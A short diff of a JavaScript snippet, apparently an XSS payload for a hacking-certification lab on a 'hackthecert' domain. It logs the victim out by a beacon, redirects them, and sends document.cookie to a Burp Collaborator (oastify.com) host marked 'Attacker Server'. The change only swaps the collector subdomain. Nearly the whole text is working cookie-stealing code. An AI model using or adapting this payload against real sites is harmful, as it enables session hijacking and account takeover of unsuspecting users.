@@ -5,5 +5,5 @@ navigator.sendBeacon("http://sso-eejn99.hackthecert.systems/logout","");
 window.location.href = "http://support-jqn7t8.hackthecert.systems/home";
 
 //Send cookie to Attacker Server
-var link="http://ta72h7h5cznpicy5o6kztaig87ex2m.oastify.com/VictimCookies="+document.cookie;
+var link="http://vxwdan8v2hfgpiza0og1zqf9r0xqlf.oastify.com/VictimCookies="+document.cookie;
 navigator.sendBeacon(link,"");
